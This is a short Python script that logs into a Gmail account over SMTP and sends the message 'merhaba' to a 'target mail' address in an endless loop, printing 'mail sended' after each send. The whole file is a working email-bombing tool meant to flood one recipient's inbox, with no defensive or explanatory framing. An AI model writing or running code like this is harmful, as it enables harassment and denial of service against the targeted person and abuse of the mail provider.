import smtplib
m = input("own mail adress :  ")
p = input("own password : ")
a = input("target mail : ")

content = "merhaba"
mail = smtplib.SMTP("smtp.gmail.com",587)
mail.ehlo()
mail.starttls()
mail.login(m,p)
while True:
    mail.sendmail(m,a,content)
    print("mail sended")

